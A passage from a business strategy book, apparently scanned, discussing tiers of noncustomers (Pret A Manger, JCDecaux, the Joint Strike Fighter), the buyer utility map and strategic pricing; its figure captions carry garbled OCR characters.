Before Pret, professionals in European city\ncenters principally frequented restaurants for lunch. Sit-down restaurants\noffered a nice meal and setting. However, the number of first-tier\nnoncustomers was high and rising. Growing concerns over the need for\nhealthy eating gave people second thoughts about eating out in restaurants.\nAnd professionals increasingly found they did not always have time for a\nsit-down meal. Some restaurants were also too expensive for lunch on a\ndaily basis. So professionals were increasingly grabbing something on the\nrun, bringing a brown bag from home, or even skipping lunch.\n\nThese first-tier noncustomers were in search of better solutions. Although\nthere were numerous differences across them, they shared three key\ncommonalities: they wanted lunch fast, they wanted it fresh and healthy,\nand they wanted it at a reasonable price.\n\nThe insight gained from the commonalities across these first-tier\nnoncustomers shed light on how Pret could unlock and aggregate untapped\ndemand. The Pret formula is simple. It offers restaurant-quality sandwiches\nmade fresh every day from only the finest ingredients, and it makes the\nfood available at a speed that is faster than that of restaurants and even fast\nfood. It also delivers this in a sleek setting at reasonable prices.\n\nConsider what Pret is like. Walking into a Pret A Manger is like walking\ninto a bright Art Deco studio. Along the walls are clean refrigerated shelves\nstocked with more than thirty types of sandwiches, baguettes, or wraps\nmade fresh that day, in that shop, from fresh ingredients delivered earlier\nthat morning. People can also choose from other freshly made items, such\nas salads, yogurt, parfaits, and blended juices. Each store has its own\nkitchen, and non-fresh items are made by high-quality producers. Even in\nits New York stores, Pret’s baguettes are from France and its croissants are\nfrom Belgium. And nothing is kept over to the next day. Leftover food is\ngiven to homeless shelters.\n\nIn addition to offering fresh healthy sandwiches and other fresh food\nitems, Pret speeds up the customer ordering experience from fast food’s\nqueue-order-pay-wait-receive-sit down purchasing cycle to a much faster\nbrowse-pick up-pay-leave cycle. On average, customers spend just ninety\nseconds from the time they get in line to the time they leave the shop. This\nis made possible because Pret produces ready-made sandwiches and other\nthings at high volume with a high standardization of assembly, does not\nmake to order, and does not serve its customers. They serve themselves as\nin a supermarket.\n\nWhereas sit-down restaurants have seen stagnant demand, Pret has been\nconverting the mass of soon-to-be noncustomers into core thriving\ncustomers who eat at Pret more often than they used to eat at restaurants.\nBeyond this, as with Callaway, restaurant-goers who were content to eat\nlunch at restaurants also have been flocking to Pret. Although restaurant\nlunches had been acceptable, the three key commonalities of first-tier\nnoncustomers struck a chord with these people; but unlike soon-to-be\nnoncustomers, they had not thought to question their lunch habits. The\nlesson: noncustomers tend to offer far more insight into how to unlock and\ngrow a blue ocean than do relatively content existing customers.\n\nToday, nearly thirty years on, Pret A Manger continues to enjoy robust\ngrowth and sail in the blue ocean it created. It is recognized to have\nrevolutionized the British sandwich industry. Pret currently has some 335\nstores with annual turnover at roughly £450 million ($760 million) per year,\nwith stores in the United Kingdom, the United States, Hong Kong, and\nFrance. !\n\nWhat are the key reasons first-tier noncustomers want to jump ship and\nleave your industry? Look for the commonalities across their responses.\nFocus on these, and not on the differences between them. You will glean\ninsight into how to desegment buyers and unleash an ocean of latent\nuntapped demand.\nSecond-Tier Noncustomers\n\nThese are refusing noncustomers, people who either do not use or cannot\nafford to use the current market offerings because they find the offerings\nunacceptable or beyond their means. Their needs are either dealt with by\nother means or ignored. Harboring within refusing noncustomers, however,\nis an ocean of untapped demand waiting to be released.\n\nConsider how JCDecaux, a vendor of French outdoor advertising space,\npulled the mass of refusing noncustomers into its market. Before JCDecaux\ncreated a new concept in outdoor advertising called “‘street furniture” in\n1964, the outdoor advertising industry included billboards and transport\nadvertisement. Billboards typically were located on city outskirts and along\nroads where traffic quickly passed by; transport advertisement comprised\npanels on buses and taxies, which again people caught sight of only as they\nwhizzed by.\n\nOutdoor advertising was not a popular campaign medium for many\ncompanies because it was viewed only in a transitory way. Outdoor ads\nwere exposed to people for a very short time while they were in transit, and\nthe rate of repeat visits was low. Especially for lesser-known companies,\nsuch advertising media were ineffective because they could not carry the\ncomprehensive messages needed to introduce new names and products.\nHence, many such companies refused to use such low-value-added outdoor\nadvertising because it was either unacceptable or a luxury they could not\nafford.\n\nHaving thought through the key commonalities that cut across refusing\nnoncustomers of the industry, JCDecaux realized that the lack of stationary\ndowntown locations was the key reason the industry remained unpopular\nand small. In searching for a solution, JCDecaux found that municipalities\ncould offer stationary downtown locations, such as bus stops, where people\ntended to wait a few minutes and hence had time to read and be influenced\nby advertisements. JCDecaux reasoned that if it could secure these locations\nto use for outdoor advertising, it could convert second-tier noncustomers\ninto customers.\n\nThis gave it the idea to provide street furniture, including maintenance\nand upkeep, free to municipalities. JCDecaux figured that as long as the\nrevenue generated from selling ad space exceeded the costs of providing\nand maintaining the furniture at an attractive profit margin, the company\nwould be on a trajectory of strong, profitable growth. Accordingly, street\nfurniture was created that would integrate advertising panels.\n\nIn this way, JCDecaux created a breakthrough in value for second-tier\nnoncustomers, the municipalities, and itself. The strategy eliminated cities’\ntraditional costs associated with urban furniture. In return for free products\nand services, JCDecaux gained the exclusive right to display advertisements\non the street furniture located in downtown areas. By making ads available\nin city centers, the company significantly increased the average exposure\ntime, improving the recall capabilities of this advertising medium. The\nincrease in exposure time also permitted richer contents and more complex\nmessages. Moreover, as the maintainer of the urban furniture, JCDecaux\ncould help advertisers roll out their campaigns in two to three days, as\nopposed to fifteen days of rollout time for traditional billboard campaigns.\nIn response to JCDecaux’s exceptional value offering, the mass of refusing\nnoncustomers flocked to the industry, and street furniture took off as a\nmedium of advertisement. By signing contracts of ten to twenty-five years\nwith municipalities, JCDecaux gained long-term exclusive rights for\ndisplaying ads with street furniture. After an initial capital investment, the\nonly expenditure for JCDecaux in the subsequent years was the\nmaintenance and renewal of the furniture. The operating margin of street\nfurniture was as high as 40 percent, compared with 14 percent for billboards\nand 18 percent for transport advertisements. The exclusive contracts and\nrelatively high operating margins created a steady source of long-term\nrevenue and profits. With this business model, JCDecaux was able to\ncapture a leap in value for itself in return for a leap in value created for its\nbuyers.\n\nToday, fifty years later, JCDecaux remains the number-one global leader\nin the street furniture-based ad market space it created. The company now\nhas nearly five hundred thousand street furniture advertising panels in\neighteen hundred cities in forty-eight countries around the world.* What’s\nmore, by looking to second-tier noncustomers and focusing on the key\ncommonalities that turned them away from the industry, JCDecaux also\nincreased the demand for outdoor advertising by existing customers of the\nindustry. Until then, existing customers had focused on what billboard\nlocations or bus lines they could secure, for what period, and for how much.\nThey took for granted that those were the only options available and\nworked within them. Again, it took noncustomers to shed insight into the\nimplicit assumptions of the industry that could be challenged and rewritten\nto create a leap in value for all.\n\nWhat are the key reasons second-tier noncustomers refuse to use the\nproducts or services of your industry? Look for the commonalities across\ntheir responses. Focus on these, and not on their differences. You will glean\ninsight into how to unleash an ocean of latent untapped demand.\nThird-Tier Noncustomers\n\nThe third tier of noncustomers is the farthest away from an industry’s\nexisting customers. Typically, these unexplored noncustomers have not been\ntargeted or thought of as potential customers by any player in the industry.\nThat’s because their needs and the business opportunities associated with\nthem have somehow always been assumed to belong to other markets.\n\nIt would drive many companies crazy to know how many third-tier\nnoncustomers they are forfeiting. Just think of the long-held assumption that\ntooth whitening was a service provided exclusively by dentists and not by\noral care consumer-product companies. Consequently, oral care companies,\nuntil relatively recently, never looked at the needs of these noncustomers.\nWhen they did, they found an ocean of latent demand waiting to be tapped;\nthey also found that they had the capability to deliver safe, high-quality, low-\ncost tooth whitening solutions, and the market exploded.\n\nThis potential applies to most industries. Consider the US defense\naerospace industry. It has been argued that the inability to control aircraft\ncosts is a key vulnerability in the long-term military strength of the United\nStates.* Soaring costs combined with shrinking budgets, concluded a 1993\nPentagon report, left the military without a viable plan to replace its aging\nfleet of fighter aircraft.‘ If the military couldn’t find a way to build aircraft\ndifferently, military leaders worried, the United States would not have\nenough airplanes to properly defend its interests.\n\nTraditionally, the Navy, Marines, and Air Force differed in their\nconceptions of the ideal fighter plane and hence each branch designed and\nbuilt its own aircraft independently. The Navy argued for a durable aircraft\nthat would survive the stress of landing on carrier decks. The Marines\nwanted an expeditionary aircraft capable of short takeoffs and landings. The\nAir Force wanted the fastest and most sophisticated aircraft.\n\nHistorically, these differences among the independent branches were taken\nfor granted, and the defense aerospace industry was regarded as having three\ndistinct and separate segments. The Joint Strike Fighter (JSF) program\naimed to challenge this industry practice.° It looked to all three segments as\npotentially unexplored noncustomers that could be aggregated into a new\nmarket of higher-performing, lower-cost fighter planes. Rather than accept\nthe existing segmentation and develop products according to the differences\nin specifications and features demanded by each branch of the military, the\nJSF program set out to question these differences. It searched for the key\ncommonalities across the three branches that had previously disregarded one\nanother.\n\nThis process revealed that the highest-cost components of the three\nbranches’ aircraft were the same: avionics (software), engines, and major\nairframe structural components. The shared use and production of these\ncomponents held the promise of enormous cost reductions. Moreover, even\nthough each branch had a long list of highly customized requirements, most\naircraft across branches performed the same missions.\n\nThe JSF team looked to understand how many of these highly customized\nfeatures decisively influenced the branches’ purchase decision. Interestingly,\nthe Navy’s answer did not hinge on a wide range of factors. Instead, it boiled\ndown to two predominant factors: durability and maintainability. With\naircraft stationed on aircraft carriers thousands of miles away from the\nnearest maintenance hangar, the Navy wants a fighter that is easy to maintain\nand yet durable as a Mack truck so that it can absorb the shock of carrier\nlandings and constant exposure to salt air. Fearing that these two essential\nqualities would be compromised with the requirements of the Marines and\nthe Air Force, the Navy bought its aircraft separately.\n\nThe Marines had many differences in requirements from those of the other\nbranches, but again only two kept them from decisively avoiding joint\naircraft purchases: the need for short takeoff vertical landing (STOVL) and\nrobust countermeasures. To support troops in remote and hostile conditions\nthe Marines need an aircraft that performs as a jet fighter and yet hovers like\na helicopter. And given the low-altitude, expeditionary nature of their\nmissions, the Marines want an aircraft equipped with various\ncountermeasures—flares, electronic jamming devices—to evade enemy\nground-to-air missiles because their planes are relatively easier targets given\ntheir short air-to-ground range.\n\nTasked with maintaining global air superiority, the Air Force demands the\nfastest aircraft and superior tactical agility—the ability to outmaneuver all\ncurrent and future enemy aircraft—and one equipped with stealth\ntechnology: radar-absorbing materials and structures to make it less visible\nto radar and therefore more likely to evade enemy missiles and aircraft. The\nother two branches’ aircraft lacked these factors, and hence the Air Force had\nnot considered them.\n\nThese findings on unexplored noncustomers made the JSF a promising\nproject. The aim was to build a single airframe in three variants that shared\nsome 70 percent of their parts while reducing or eliminating the other factors\nthat had been taken for granted by each branch but were, in effect, not\ncritically decisive to their purchase decision (see figure 5-2).\n\nFIGURE 5-2\n\nThe key competing factors of the defense aerospace industry\n\nThe JSF project found that despite the wide range of key competing factors,\nonly those shaded in grey were decisive to each branch ss fighter aircraft\ndecision.\nAir Force Navy Marines\nLightweight Two engines\nIntegrated avionics Two seats Lightweight\nStealth Large wings Short wings Design\n1 3 customization\nSupercruise engine\nLong-distance Long-distance\nAgility Maintainability\ng Large/flexible Large/flexible\nAirair armaments weapons payload weapons payload\nBae ‏سے‎ j Weapons\nFixed internal Air-air and air-ground ‏...م۱‎ ground armaments নানা না\nweapons payload armaments\nElectronic warfare\nAn aircraft built for An aircraft built for An aircraft built for Mission\nevery mission every mission every mission customization\n\nThe JSF promised to be some one-third the cost per fighter aircraft. At the\nsame time, the performance of the JSF, now called the F-35, promised to be\nsuperior to that of the top-performing aircraft for the three branches then: the\nAir Force’s F-16, the Marine’s AV-8B Harrier jet, and the Navy’s F-18. By\nfocusing on the key decisive factors and dropping or reducing other factors\nin the three dominant domains of customization—namely, design, weapons,\nand mission customization—the JSF program undertook offering a superior\nfighter plane at a lower cost. It was also reckoned that aggregating demand\npreviously divided among the three branches would further lower the cost.\n\nIn fall 2001, Lockheed Martin was awarded the massive $200 billion JSF\ncontract—the largest military contract in history—over Boeing. The\nPentagon was confident that the program would be an unqualified success\n\nnot only because the strategic profile of the F-35 achieved exceptional value\nat lower cost but also because it had won the support of all three defense\n\nbranches that counted on it to replace their aging aircraft fleets.°\n\nWhile the conception and prototype of the F-35 were well received, a\nproject of this magnitude and complexity will always have unusual\nexecution challenges. As there are great execution lessons to be learned here,\nwe will revisit this move and discuss its execution issue separately in chapter\n8. At the end of the day, actual delivery of performance is a function of not\nonly creative conception but also good execution.’\nGo for the Biggest Catchment\n\nThere is no hard-and-fast rule to suggest which tier of noncustomers you\nshould focus on and when. Because the scale of blue ocean opportunities\nthat a specific tier of noncustomers can unlock varies across time and\nindustries, you should focus on the tier that represents the biggest\ncatchment that your organization has the capability to act on. But you\nshould also explore whether there are overlapping commonalities across all\nthree tiers of noncustomers. In that way, you can expand the scope of latent\ndemand you can unleash. When that is the case, you should not focus on a\nspecific tier but instead should look across tiers. The rule here is to go for\nthe largest catchment that your organization has competence to seize.\n\nThe natural strategic orientation of many companies is toward retaining\nexisting customers and seeking further segmentation opportunities. This is\nespecially true in the face of competitive pressure. Although this might be a\ngood way to gain a focused competitive advantage and increase share of the\nexisting market space, it is not likely to produce a blue ocean that expands\nthe market and creates new demand. The point here is not to argue that it’s\nwrong to focus on existing customers or segmentation but rather to\nchallenge these existing, taken-for-granted strategic orientations. What we\nsuggest is that to maximize the scale of your blue ocean, you should first\nreach beyond existing demand to noncustomers and desegmentation\nopportunities as you formulate future strategies.\n\nIf no such opportunities can be found, you can then move on to further\nexploit differences among existing customers. But in making such a\nstrategic move, you should be aware that you might end up landing in a\nsmaller space. You should also be aware that when your competitors\nsucceed in attracting the mass of noncustomers with a value innovation\nmove, many of your existing customers may be attracted away because they\ntoo may be willing to put their differences aside to gain the offered leap in\nvalue.\n\nIt is not enough to maximize the size of the blue ocean you are creating.\nYou must profit from it to create a sustainable win-win outcome. The next\nchapter shows how to build a viable business model that produces and\nmaintains profitable growth for your blue ocean offering.\nCHAPTER 6\n\nGet the Strategic Sequence Right\n\n'Y ou’VE LOOKED ACROSS PATHS to discover possible blue oceans. You’ve\nconstructed a strategy canvas that clearly articulates your future blue ocean\nstrategy. And you have explored how to aggregate the largest catchment of\nbuyers for your idea. The next challenge is to build a robust business model\nto ensure that you make a healthy profit on your blue ocean idea. This\nbrings us to the fourth principle of blue ocean strategy: get the strategic\nsequence right.\n\nThis chapter discusses the strategic sequence of fleshing out and\nvalidating blue ocean ideas to ensure their commercial viability. With an\nunderstanding of the right strategic sequence and of how to assess blue\nocean ideas along the key criteria in that sequence, you dramatically reduce\nbusiness model risk.\nThe Right Strategic Sequence\n\nAs shown in figure 6-1, companies need to build their blue ocean strategy\nin the sequence of buyer utility, price, cost, and adoption.\n\nFIGURE 6-1\n\nThe sequence of blue ocean strategy\nNo—Rethink\n\nNo—Rethink\n\nNo—Rethink\n\nNo—Rethink\n\nBuyer utility\n\nls there exceptional buyer utility\nin your business idea?\n\nIs your price easily accessible\nto the target mass of buyers?\n\nCan you attain your cost target\nto profit at your strategic price?\n\nAdoption\n\nWhat are the adoption hurdles in\nactualizing your business idea?\nAre you addressing them up front?\n\nA commercially\nviable\nblue ocean idea\n\nThe starting point is buyer utility. Does your offering unlock exceptional\nutility? Is there a compelling reason for the target mass of people to buy it?\nAbsent this, there is no blue ocean potential to begin with. Here there are\nonly two options. Park the idea, or rethink it until you reach an affirmative\nanswer.\n\nWhen you clear the exceptional utility bar, you advance to the second\nstep: setting the right strategic price. Remember, a company does not want\nto rely solely on price to create demand. The key question here is this: Is\nyour offering priced to attract the mass of target buyers so that they have a\ncompelling ability to pay for your offering? If it is not, they cannot buy it.\nNor will the offering create irresistible market buzz.\n\nThese first two steps address the revenue side of a company’s business\nmodel. They ensure that you create a leap in net buyer value, where net\nbuyer value equals the utility buyers receive minus the price they pay for it.\n\nSecuring the profit side brings us to the third element: cost. Can you\nproduce your offering at the target cost and still earn a healthy profit\nmargin? Can you profit at the strategic price—the price easily accessible to\nthe mass of target buyers? You should not let costs drive prices. Nor should\nyou scale down utility because high costs block your ability to profit at the\nstrategic price. When the target cost cannot be met, you must either forgo\nthe idea because the blue ocean won’t be profitable, or you must innovate\nyour business model to hit the target cost. The cost side of a company’s\nbusiness model ensures that it creates a leap in value for itself in the form of\nprofit—that is, the price of the offering minus the cost of production. It is\nthe combination of exceptional utility, strategic pricing, and target costing\nthat allows companies to achieve value innovation—a leap in value for both\nbuyers and companies.\n\nThe last step is to address adoption hurdles. What are the adoption\nhurdles in rolling out your idea? Have you addressed these up front? The\nformulation of blue ocean strategy is complete only when you can address\nadoption hurdles in the beginning to ensure the successful actualization of\nyour idea. Adoption hurdles include, for example, potential resistance to the\nidea by retailers or partners. Because blue ocean strategies represent a\nsignificant departure from red oceans, it is key to address adoption hurdles\nup front.\n\nHow can you assess whether your blue ocean strategy is passing through\neach of the four sequential steps? And how can you refine your idea to pass\neach bar? Let’s address these questions, starting with utility.\nTesting for Exceptional Utility\n\nThe need to assess the buyer utility of your offering may seem self-evident.\nYet many companies fail to deliver exceptional value because they are\nobsessed by the novelty of their product or service, especially if new\ntechnology plays a part in it.\n\nConsider Philips’ CD-i, an engineering marvel that failed to offer people a\ncompelling reason to buy it. The player was promoted as the “Imagination\nMachine” because of its diverse functions. CD-i was a video machine, music\nsystem, game player, and teaching tool all wrapped into one. Yet it did so\nmany different tasks without an easy or intuitive user interface that people\ncould not understand how to use it without a significant investment of time\nand complicated manuals. In addition, it lacked attractive software titles. So\neven though the CD-i theoretically could do almost anything, in reality it\ncould do very little. Customers lacked a compelling reason and ability to use\nit, and sales never took off.\n\nManagers responsible for Philips’ CD-i (as well as Motorola’s Iridium)\nfell into the same trap: they reveled in the bells and whistles of their new\ntechnology. They acted on the assumption that bleeding-edge technology is\nequivalent to bleeding-edge utility for buyers—something that, our research\nfound, is rarely the case.\n\nThe technology trap that snagged Philips and Motorola trips up the best\nand brightest companies time and again. Unless the technology makes\nbuyers’ lives dramatically simpler, more convenient, more productive, less\nrisky, or more fun and fashionable, it will not attract the masses no matter\nhow many awards it wins. Value innovation is not the same as technology\ninnovation.\n\nTo get around this trap, the starting point, as articulated in chapter 2, is to\ncreate a strategic profile that passes the initial litmus test of being focused,\nbeing divergent, and having a compelling tagline that speaks to buyers.\nHaving done this, companies are ready to expressly assess where and how\nthe new product or service will change the lives of its buyers. Such a\ndifference in perspective is important because it means that the way a\nproduct or service is developed becomes less a function of its technical\npossibilities and more a function of its utility to buyers.\nThe buyer utility map helps managers look at this issue from the right\nperspective (see figure 6-2). It outlines all the levers companies can pull to\ndeliver exceptional utility to buyers as well as the various experiences\nbuyers can have with a product or service. This map allows managers to\nidentify the full range of utility spaces that a product or service can\npotentially fill. Let’s look at the map’s dimensions in detail.\n\nFIGURE 6-2\n\nThe buyer utility map\n\nThe six stages of the buyer experience cycle\n\n1 2: 3. 4. 5. 6.\nPurchase Delivery Use Supplements Maintenance _ Disposal\n\nCustomer\nproductivity\nSimplicity\n\nConvenience\n\nRisk\n\nThe six utility levers\n\nFun and\nimage\n\nEnvironmental\nfriendliness\n\nThe Six Stages of the Buyer Experience Cycle\n\nA buyer’s experience can usually be broken into a cycle of six stages,\nrunning more or less sequentially from purchase to disposal. Each stage\nencompasses a wide variety of specific experiences. Purchasing, for\nexample, may include the experience of browsing eBay as well as the aisles\nof The Home Depot. At each stage, managers can ask a set of questions to\ngauge the quality of buyers’ experience, as described in figure 6-3.\nThe Six Utility Levers\n\nCutting across the stages of the buyer’s experience are what we call utility\nlevers: the ways in which companies can unlock exceptional utility for\nbuyers. Most of the levers are obvious. Simplicity, fun and image, and\nenvironmental friendliness need little explanation. Nor does the idea that a\nproduct might reduce a customer’s financial, physical, or credibility risks.\nAnd a product or service offers convenience simply by being easy to obtain,\nuse, or dispose of. The most commonly used lever is that of customer\nproductivity, in which an offering helps a customer do things faster or better.\n\nTo test for exceptional utility, companies should check whether their\noffering has removed the greatest blocks to utility across the entire buyer\nexperience cycle for customers and noncustomers. The greatest blocks to\nutility often represent the greatest and most pressing opportunities to unlock\nexceptional value. Figure 6-4 shows how a company can identify the most\ncompelling hot spots to unlock exceptional utility. By locating your\nproposed offering on the thirty-six spaces of the buyer utility map, you can\nclearly see how, and whether, the new idea not only creates a different utility\nproposition from existing offerings but also removes the biggest blocks to\nutility that stand in the way of converting noncustomers into customers. If\nyour offering falls on the same space or spaces as those of other players,\nchances are it is not a blue ocean offering.\n\nFIGURE 6-3\n\nThe buyer experience cycle\nUse ‏+ے‎ Supplements 一 > Maintenance —> Disposal\n\nDoes the product require 078\n\nexternal maintenance? © product create\nwaste items?\n\nHow easy is it to maintain\n\nand upgrade the product?

Before its debut, the more than five hundred\nautomakers in the United States focused on building custom-made luxury\nautos for the wealthy. In terms of the buyer utility map, the entire industry\nfocused on image in the use phase, creating luxury cars for fashionable\nweekend outings. Only one of the thirty-six utility spaces was occupied.\n\nThe greatest blocks to utility for the mass of people, however, were not in\nrefining the auto’s luxury or stylish image. Rather, they had to do with two\nother factors. One was convenience in the use phase. The bumpy and muddy\ndirt roads that prevailed at the century’s start were a natural for horses to\ntread over but often prevented finely crafted autos from passing. This\nsignificantly limited where and when cars could travel (driving on rainy and\nsnowy days was ill advised), making the use of the car limited and\ninconvenient. The second block to utility was risk in the maintenance phase.\nThe cars, being finely crafted and having multiple options, often broke\ndown, requiring experts to fix them, and experts were expensive and in short\nsupply.\n\nIn one fell swoop, Ford’s Model T eliminated these two utility blocks. The\nModel T was called the car for the great multitude. It came in only one color\n\n(black) and one model, with scant options. In this way, Ford eliminated\ninvestments in image in the use phase. Instead of creating cars for weekends\nin the countryside—a luxury few could justify—Ford’s Model T was made\nfor everyday use. It was reliable. It was durable; it was designed to travel\neffortlessly over dirt roads and in rain, sleet, or shine. It was easy to fix and\nuse. People could learn to drive it in one day.\n\nIn this way the buyer utility map highlights the differences between ideas\nthat genuinely create new and exceptional utility and those that are\nessentially revisions of existing offerings or technological breakthroughs not\nlinked to value. The aim is to check whether your offering passes the\nexceptional utility test, as did the Model T. By applying this diagnostic, you\ncan find out how your idea needs to be refined.\n\nWhere are the greatest blocks to utility across the buyer experience cycle\nfor your customers and noncustomers? Does your offering effectively\neliminate these blocks? If it does not, chances are your offering is innovation\nfor innovation’s sake or a revision of existing offerings. When a company’s\noffering passes this test, the company is ready to move to the next step.\nFrom Exceptional Utility to Strategic Pricing\n\nTo secure a strong revenue stream for your offering, you must set the right\nstrategic price. This step ensures that buyers not only will want to buy your\noffering but also will have a compelling ability to pay for it. Many\ncompanies take a reverse course, first testing the waters of a new product or\nservice by targeting novelty-seeking, price-insensitive customers at the\nlaunch of a new business idea; only over time do they drop prices to attract\nmainstream buyers. It is increasingly important, however, to know from the\nstart what price will quickly capture the mass of target buyers.\n\nThere are two reasons for this change. First, companies are discovering\nthat volume generates higher returns than it used to. As the nature of goods\nbecomes more knowledge intensive, companies bear much more of their\ncosts in product development than in manufacturing. This is easy to\nunderstand in the software industry. While producing Apple’s iOS software,\nfor example, cost Apple billions, once produced it could be installed in an\ninfinite number of computers for a nearly trivial cost to Apple. This makes\nvolume key.\n\nA second reason is that to a buyer, the value of a product or service may\nbe closely tied to the total number of people using it. A classic example is the\nonline auction service managed by eBay, where the more people who use it,\nthe more attractive the site becomes to both the sellers and buyers of goods.\nAs a result of this phenomenon, called network externalities, many products\nand services are increasingly an all-or-nothing proposition: either you sell\nmillions at once, or you sell nothing at all.!\n\nIn the meantime, the rise of knowledge-intensive products also creates the\npotential for free riding. This relates to the nonrival and partially excludable\nnature of knowledge.” The use of a rival good by one firm precludes its use\nby another. So, for example, Nobel Prize-winning scientists who are fully\nemployed by IBM cannot simultaneously be employed by another company.\nNor can scrap steel consumed by Nucor be simultaneously consumed for\nproduction by other mini-mill steelmakers.\n\nIn contrast, the use of a nonrival good by one firm does not limit its use\nby another. Ideas fall into this category. So, for example, when Virgin\nAtlantic Airways launched its Upper Class brand—which, for the first time,\nessentially combined the huge seats and legroom of traditional first class\nwith the price of business-class tickets—other airlines were free to apply this\nidea to their own business-class service without limiting Virgin’s ability to\nuse it. This makes competitive imitation not only possible but less costly.\nThe cost and risk of developing an innovative idea are borne by the initiator,\nnot the follower.\n\nThis challenge is exacerbated when the notion of excludability is\nconsidered. Excludability is a function both of the nature of the good and of\nthe legal system. A good is excludable if the company can prevent others\nfrom using it because of, for example, limited access or patent protection.\nIntel, for example, can exclude other semiconductor chipmakers from using\nits manufacturing facilities through property ownership laws. The Asian\nbarbershop QB House, however, cannot exclude someone from walking into\nany of its shops, studying its layout, atmosphere, and haircutting routine, and\nmimicking its innovative barbershop concept. Once ideas are out there,\nknowledge naturally spills over to other firms.\n\nThis lack of excludability reinforces the risk of free-riding. Like the\ncreative concepts of Pret A Manger or JCDecaux, many of the most powerful\nblue ocean ideas have tremendous value but in themselves consist of no new\ntechnological discoveries. As a result they are neither patentable nor\nexcludable and hence are vulnerable to imitation.\n\nAll this means that the strategic price you set for your offering must not\nonly attract buyers in large numbers but also help you to retain them. Given\nthe high potential for free riding, an offering’s reputation must be earned on\nday one, because brand building increasingly relies heavily on word-of-\nmouth recommendations spreading rapidly through our networked society.\nCompanies must therefore start with an offer that buyers can’t refuse and\nmust keep it that way to discourage any free-riding imitations. This is what\nmakes strategic pricing key. Strategic pricing addresses this question: Is your\noffering priced to attract the mass of target buyers from the start so that they\nhave a compelling ability to pay for it? When exceptional utility is combined\nwith strategic pricing, imitation is discouraged.\n\nWe have developed a tool called the price corridor of the target mass to\nhelp managers find the right price for an irresistible offer, which, by the way,\nisn’t necessarily the lower price. The tool involves two distinct but\ninterrelated steps (see figure 6-5).\nFIGURE 6-5\n\nThe price corridor of the target mass\n\nStep 1: Identify the price\ncorridor of the target mass.\n\nStep 2: Specify a price level\nwithin the price corridor.\n\nThree alternative product/service types:\n\nDifferent form\nSame Different form, and function,\n\nform same function same objective\n\n০০\n\nHigh degree of legal and\n\n7 resource protection\nO 〇 ever ۴ Difficult to imitate\n\nچچچہ سے\n‎Some degree of legal and‏ - 【\n‎〈〕f[,|'|(蘑。 corridor Mid-level pricing i os‏\n\n০ Se .. ۰ _[\n\nthe target O resource protection\n‏ےت‎ 7-7 Low degree of legal and\nO Dri ‏وہہ‎ resource protection\n0 Easy to imitate\n\nSize of circle is proportional to number\nof buyers that product/service attracts\n\nStep 1: Identify the Price Corridor of the Target Mass\n\nIn setting a price, all companies look first at the products and services that\nmost closely resemble their idea in terms of form. Typically they look at\nother products and services within their industries. That’s still a necessary\nexercise, of course, but it is not sufficient to attract new customers. So the\nmain challenge in determining a strategic price is to understand the price\nsensitivities of those people who will be comparing the new product or\nservice with a host of very different-looking products and services offered\noutside the group of traditional competitors.\n\nA good way to look outside industry boundaries is to list products and\nservices that fall into two categories: those that take different forms but\nperform the same function, and those that take different forms and functions\nbut share the same overarching objective.\n\nDifferent form, same function.\n\nMany companies that create blue oceans attract customers from other\nindustries who use a product or service that performs the same function or\nbears the same core utility as the new one but takes a very different physical\nform. In the case of Ford’s Model T, Ford looked to the horse-drawn\ncarriage. The horse-drawn carriage had the same core utility as the car:\ntransportation for individuals and families. But it had a very different form:\na live animal versus a machine. Ford effectively converted the majority of\nnoncustomers of the auto industry, namely customers of horse-drawn\ncarriages, into customers of its own blue ocean by pricing its Model T\nagainst horse-drawn carriages and not the cars of other automakers.\n\nIn the case of the school lunch catering industry, raising this question led\nto an interesting insight. Suddenly those parents who make their children’s\nlunches came into the equation. For many children, parents had the same\nfunction: making their child’s lunch. But they had a very different form:\nmom or dad versus a lunch line in the cafeteria.\n\nDifferent form and function, same objective.\n\nSome companies lure customers from even further away. Cirque du Soleil,\nfor example, has diverted customers from a wide range of evening\nactivities. Its growth came in part through drawing people away from other\nactivities that differed in both form and function. For example, bars and\nrestaurants have few physical features in common with a circus. They also\nserve a distinct function by providing conversational and gastronomical\npleasure, a very different experience from the visual entertainment that a\ncircus offers. Yet despite these differences in form and function, people\nhave the same objective in undertaking these three activities: to enjoy a\nnight out.\n\nListing the groups of alternative products and services allows managers\nto see the full range of buyers they can poach from other industries as well\nas from nonindustries, such as parents (for the school lunch catering\nindustry) or the noble pencil in managing household finances (for the\npersonal finance software industry). Having done this, managers should\nthen graphically plot the price and volume of these alternatives, as shown in\nfigure 6-5.\n\nThis approach provides a straightforward way to identify where the mass\nof target buyers is and what prices these buyers are prepared to pay for the\nproducts and services they currently use. The price bandwidth that captures\nthe largest groups of target buyers is the price corridor of the target mass.\n\nIn some cases, the range is very wide. For Southwest Airlines, for\nexample, the price corridor of the mass covered the group of people paying,\non average, some $400 to buy an economy-class short-haul ticket to about\n$60 for the cost of going the same distance by car. The key here is not to\npursue pricing against the competition within an industry but rather to\npursue pricing against substitutes and alternatives across industries and\nnonindustries. Had Ford, for example, priced its Model T against other\nautos, which were more than three times the price of horse-drawn carriages,\nthe market for the Model T would not have exploded.\nStep 2: Specify a Level within the Price Corridor\n\nThe second part of the tool helps managers determine how high a price they\ncan afford to set within the corridor without inviting competition from\nimitation products or services. That assessment depends on two principal\nfactors. First is the degree to which the product or service is protected\nlegally through patents or copyrights. Second is the degree to which the\ncompany owns some exclusive asset or core capability, such as an\nexpensive production plant or unique design competence that can block\nimitation. Dyson, the British electrical white goods company, for example,\nhas been able to charge a high unit price for its bagless vacuum cleaner\nfrom the product’s launch in 1995 until today, thanks to strong patents,\nhard-to-imitate service capabilities, and a striking design.\n\nMany other companies have used upper-boundary strategic pricing to\nattract the mass of target buyers. Examples include Philips’ Alto in the\nprofessional lighting industry, the Lycra brand created by DuPont (and now\nowned by Invista) in specialty chemicals, SAP in the business application\nsoftware industry, and Bloomberg in the financial software industry. On the\nother hand, companies with uncertain patent and asset protection should\nconsider pricing somewhere in the middle of the corridor. As for companies\nthat have no such protection, lower-boundary strategic pricing is advised. In\nthe case of Southwest Airlines, because its service wasn’t patentable and\nrequired no exclusive assets, its ticket prices fell into the lower boundary of\nthe corridor—namely, against the price of car travel. Companies would be\nwise to pursue mid-to lower-boundary strategic pricing from the start if any\nof the following apply:\n\n* Their blue ocean offering has high fixed costs and marginal variable\ncosts.\n\n* The attractiveness of the blue ocean offering depends heavily on\nnetwork externalities.\n\n* The cost structure behind the blue ocean offering benefits from steep\neconomies of scale and scope. In these cases, volume brings with it\nsignificant cost advantages, something that makes pricing for volume\neven more 